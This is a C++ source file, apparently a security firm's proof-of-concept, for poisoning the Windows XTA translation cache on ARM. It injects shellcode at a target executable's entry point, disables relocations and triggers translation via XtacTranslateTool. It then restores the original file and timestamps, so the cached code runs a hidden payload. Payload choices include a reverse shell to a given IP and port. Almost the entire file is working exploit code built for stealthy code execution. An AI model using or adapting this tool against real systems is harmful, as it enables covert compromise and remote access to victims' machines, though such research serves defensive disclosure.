// (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
#include <Windows.h>

#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <format>
#include <any>
#include <numeric>

#include <DbgHelp.h>

#include "shellcode.h"

#pragma comment (lib, "dbghelp.lib")
#pragma comment (lib, "Ws2_32.lib")

namespace fs = std::filesystem;

#define LOG(msg) std::cout << "[+] " << msg << std::endl
#define ERR(msg) std::cerr << "[-] " << msg << std::endl

enum SHELLCODE_TYPE {
	REVERSE_SHELL,
	CALC,
	MSG_BOX,
	CUSTOM,

	NONE,
};

std::optional<std::tuple<std::string, SHELLCODE_TYPE, std::vector<std::any>>> ParseArguments(int argc, char* argv[]) {
	const std::string inputExe(argv[1]);
	const std::string shellcodeName(argv[2]);

	std::vector<std::any> shellcodeParams;
	SHELLCODE_TYPE shellcodeType = NONE;

	if (shellcodeName == "revshell") {
		if (argc != 5) {
			ERR("Please specify <ip address> and <port number>");
			return std::nullopt;
		}

		shellcodeType = REVERSE_SHELL;
		const uint32_t ipAddr = inet_addr(argv[3]);
		shellcodeParams.push_back(ipAddr);
		const uint16_t portNumber = htons(std::stoi(argv[4], nullptr, 10));
		shellcodeParams.push_back(portNumber);
	}
	else if (shellcodeName == "calc") {
		shellcodeType = CALC;
	}
	else if (shellcodeName == "msgbox") {
		shellcodeType = MSG_BOX;
	}
	else if (shellcodeName == "custom") {
		shellcodeType = CUSTOM;
		if (argc != 5) {
			ERR("Please specify <shellcode.bin> <shellcode_rvas.txt> as arguments");
			ERR("You can create these files using CreateShellcode and ShellcodeTemplate in this repo");
			ERR("Please refer to README.md");
			return std::nullopt;
		}
		shellcodeParams.push_back(std::string(argv[3]));
		shellcodeParams.push_back(std::string(argv[4]));
	}

	if (shellcodeType == NONE) {
		ERR(std::format("{} is not supported", shellcodeName));
		return std::nullopt;
	}

	return std::make_tuple(inputExe, shellcodeType, shellcodeParams);
}

std::pair<std::vector<uint8_t>, std::vector<uint32_t>> GetShellcode(SHELLCODE_TYPE shellcodeType, const std::vector<std::any>& shellcodeParams) {
	switch (shellcodeType) {
	case REVERSE_SHELL: {
		try {
			const auto ipAddr = std::any_cast<uint32_t>(shellcodeParams[0]);
			const auto portNumber = std::any_cast<uint16_t>(shellcodeParams[1]);
			*(uint32_t*)(revshellCode.data() + ipAddrOffset) = ipAddr;
			*(uint16_t*)(revshellCode.data() + portOffset) = portNumber;
			return { revshellCode, revshellCodeRvas };
		}
		catch (std::bad_any_cast& e) {
			ERR(e.what());
			return { {}, {} };
		}
	}
	case CALC:
		return { calcShellcode, calcShellcodeRvas };
	case MSG_BOX:
		return { msgBoxShellcode, msgBoxShellcodeRvas };
	case CUSTOM: {
		try {
			const auto shellcodeBinFile = std::any_cast<std::string>(shellcodeParams[0]);
			LOG(std::format("Reading shellcode from {}", shellcodeBinFile));
			const auto fileSize = fs::file_size(shellcodeBinFile);
			std::vector<uint8_t> shellcode(fileSize);
			std::ifstream finShellcode(shellcodeBinFile, std::ios::binary);
			finShellcode.read((char*)shellcode.data(), fileSize);

			const auto rvasFile = std::any_cast<std::string>(shellcodeParams[1]);
			LOG(std::format("Reading RVAs from {}", rvasFile));
			std::ifstream finRvas(rvasFile);
			std::vector<uint32_t> rvas;
			std::string line, elem;
			std::getline(finRvas, line);
			std::stringstream lineSs(line);
			LOG(std::format("RVAs are ..."));
			while (std::getline(lineSs, elem, ',')) {
				const auto rva = std::stoi(elem, nullptr, 16);
				std::cout << std::hex << "0x" << rva << ", ";
				rvas.push_back(rva);
			}
			std::cout << std::endl;

			return { shellcode, rvas };
		}
		catch (std::bad_any_cast& e) {
			ERR(e.what());
			return { {}, {} };
		}
	}
	default:
		return { {}, {} };
	}
}

std::optional<uint32_t> rvaToPa(PIMAGE_NT_HEADERS pImageNtHeaders, PVOID base, uint32_t rva) {
	PIMAGE_SECTION_HEADER pImageSectionHeader = ImageRvaToSection(pImageNtHeaders, base, rva);
	if (pImageSectionHeader == NULL) {
		ERR("Failed to call ImageRvaToSection");
		return std::nullopt;
	}
	return pImageSectionHeader->PointerToRawData + (rva - pImageSectionHeader->VirtualAddress);
}

std::optional<std::tuple<uint32_t, uint32_t, std::optional<uint32_t>>> GetRequiredPEMetadata(const std::string& inputExe) {
	HANDLE fileHandle = CreateFileA(inputExe.c_str(), FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (fileHandle == NULL) {
		ERR(std::format("Failed to call CreateFileA when opening {}", inputExe));
		return std::nullopt;
	}

	HANDLE fileMapping = CreateFileMappingA(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
	if (fileMapping == NULL) {
		ERR(std::format("Failed to call OpenFileMappingA when opening {}", inputExe));
		return std::nullopt;
	}

	PVOID buffer = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
	if (buffer == NULL) {
		ERR(std::format("Failed to call MapViewOfFIle when opening {}", inputExe));
		return std::nullopt;
	}

	PIMAGE_NT_HEADERS pImageNtHeaders = ImageNtHeader(buffer);
	if (pImageNtHeaders == NULL) {
		ERR("Failed to call ImageNtHeader");
		return std::nullopt;
	}

	const uint32_t entryRva = pImageNtHeaders->OptionalHeader.AddressOfEntryPoint;
	const auto entryPa = rvaToPa(pImageNtHeaders, buffer, entryRva);
	if (!entryPa.has_value()) {
		ERR("Cannot get physical address of entrypoint");
		return std::nullopt;
	}
	LOG(std::format("Physical address of entrypoint is {:#x}", entryPa.value()));

	const uint32_t relocSectRva = pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	std::optional<uint32_t> relocSectPa = std::nullopt;
	if (relocSectRva != 0) {
		relocSectPa = rvaToPa(pImageNtHeaders, buffer, relocSectRva);
		if (!relocSectPa.has_value()) {
			ERR("Cannot get physical address of .reloc");
			return std::nullopt;
		}
		LOG(std::format("Physical address of .reloc is {:#x}", relocSectPa.value()));
	}
	else {
		LOG("There is no .reloc section");
	}

	PIMAGE_SECTION_HEADER pImageSectionHeader = ImageRvaToSection(pImageNtHeaders, buffer, entryRva);
	if (pImageSectionHeader == NULL) {
		ERR("Cannot get ImageSectionHeader");
		return std::nullopt;
	}
	LOG(std::format("Section Flags are {:#x}", pImageSectionHeader->Characteristics));
	if ((pImageSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImageSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE)) {
		ERR("This executable has W+X section. So, this does not use XTA cache files.");
		return std::nullopt;
	}

	if (UnmapViewOfFile(buffer) == 0) {
		ERR("Failed to UnmapViewOfFile");
		return std::nullopt;
	}
	if (CloseHandle(fileMapping) == 0) {
		ERR("Failed to CloseHandle");
		return std::nullopt;
	}
	if (CloseHandle(fileHandle) == 0) {
		ERR("Failed to CloseHandle");
		return std::nullopt;
	}
	
	return std::make_tuple(entryPa.value(), entryRva, relocSectPa);
}

std::optional<const FILETIME*> ChangeMTimeStamp(const std::string& fileName, const FILETIME* newMTime) {
	HANDLE fileHandle = CreateFileA(fileName.c_str(), FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		ERR(std::format("Cannot open file {} {}", fileName, GetLastError()));
		return std::nullopt;
	}

	FILETIME oldATime{}, oldMTime{}, oldBirthTime{};
	if (GetFileTime(fileHandle, &oldBirthTime, &oldATime, &oldMTime) == 0) {
		ERR(std::format("Cannot get file time {}", fileName));
		return std::nullopt;
	}

	if (SetFileTime(fileHandle, &oldBirthTime, &oldATime, newMTime) == 0) {
		ERR(std::format("Cannot set file time {}", fileName));
		return std::nullopt;
	}

	if (CloseHandle(fileHandle) == 0) {
		ERR("Failed to CloseHandle");
		return std::nullopt;
	}

	return newMTime;
}

void Translate(const std::string& inputExe, const std::vector<uint32_t>& rvas, uint32_t entryRva) {
	const auto absPath = fs::absolute(inputExe);
	const auto rvas_args_str = std::accumulate(std::begin(rvas), std::end(rvas), std::string(""), [entryRva](std::string acc, uint32_t rva) {
		std::stringstream ss;
		ss << std::hex << rva + entryRva;
		return acc + " " + "0x" + ss.str();
	});
	const auto cmd = std::format("cmd.exe /c XtacTranslateTool.exe \"{}\" {}", absPath.string(), rvas_args_str);
	LOG(std::format("Translating (command is {})", cmd));
	system(cmd.c_str());
}

void InjectShellcode(const std::string& inputExe, const uint32_t entryPa, const std::vector<uint8_t>& payload) {
	std::fstream f(inputExe, std::ios::binary | std::ios::in | std::ios::out);
	f.seekp(entryPa, std::ios::beg);
	f.write((char*)payload.data(), payload.size());
}

void DisableRelocation(const std::string& inputExe, const uint32_t relocSectionOffset) {
	std::fstream f(inputExe, std::ios::binary | std::ios::in | std::ios::out);
	f.seekp(relocSectionOffset, std::ios::beg);
	uint64_t dataNull = 0;
	f.write((char*)&dataNull, sizeof(uint64_t));
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		ERR("Usage:");
		ERR(std::format("{} <input executable> <shellcode name> <shellcode parameters>", argv[0]));
		return EXIT_FAILURE;
	}

	LOG("Getting arguments");
	auto result = ParseArguments(argc, argv);
	if (!result.has_value()) {
		return EXIT_FAILURE;
	}
	const auto [inputExe, shellcodeType, shellcodeParams] = result.value();
	const auto [shellcodePayload, shellcodeRvas] = GetShellcode(shellcodeType, shellcodeParams);
	const auto inputExeBackup = fs::path(inputExe).filename().string() + ".back";
	
	if (!fs::exists(inputExeBackup)) {
		LOG("Making backup");
		LOG(std::format("{} -> {}", inputExe, inputExeBackup));
		fs::copy(inputExe, inputExeBackup, fs::copy_options::overwrite_existing);
	}

	LOG(std::format("Getting PE Metadata of {}", inputExe));
	const auto entry = GetRequiredPEMetadata(inputExe);
	if (!entry.has_value()) {
		ERR("Cannot get PE Metadata");
		return EXIT_FAILURE;
	}
	const auto [entryPa, entryRva, relocSectPa] = entry.value();

	LOG("Getting current system time");
	SYSTEMTIME curTime{};
	FILETIME curTimeFile{};
	GetSystemTime(&curTime);
	if (SystemTimeToFileTime(&curTime, &curTimeFile) == 0) {
		ERR("Cannot convert SYSTEMTIME");
		return EXIT_FAILURE;
	}

	LOG("Injecting shellcode");
	InjectShellcode(inputExe, entryPa, shellcodePayload);

	if (relocSectPa.has_value()) {
		LOG("Disabling reloc");
		DisableRelocation(inputExe, relocSectPa.value());
	}

	LOG("Changing timestamp");
	ChangeMTimeStamp(inputExe, &curTimeFile);

	LOG("Poisoning XTA cache");
	Translate(inputExe, shellcodeRvas, entryRva);

	Sleep(100);

 	LOG("Restoring to the original file");
 	LOG(std::format("{} -> {}", inputExeBackup, inputExe));
 	fs::copy(inputExeBackup, inputExe, fs::copy_options::overwrite_existing);
 
 	LOG("Restoring to the original file timestamp");
 	ChangeMTimeStamp(inputExe, &curTimeFile);

	LOG("Done");
}
